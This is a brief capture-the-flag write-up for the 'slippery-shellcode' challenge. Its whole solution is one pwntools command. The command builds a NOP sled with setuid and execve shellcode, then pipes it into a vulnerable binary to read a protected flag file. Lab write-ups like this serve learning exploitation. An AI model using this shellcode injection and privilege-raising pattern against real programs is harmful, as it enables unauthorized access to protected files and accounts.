# slippery-shellcode

## Summary

This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_2_4061c12f5a4a9d8c1c3f45b25fbcb09a on the shell server. Source.

## Solution

```sh
cd /problems/slippery-shellcode_2_4061c12f5a4a9d8c1c3f45b25fbcb09a; python -c 'from pwn import *; print(asm(shellcraft.nop() * 400 + shellcraft.setuid(1002) + shellcraft.execve(path="/bin/cat", argv=["/bin/cat","./flag.txt"])))' | ./vuln;echo
```
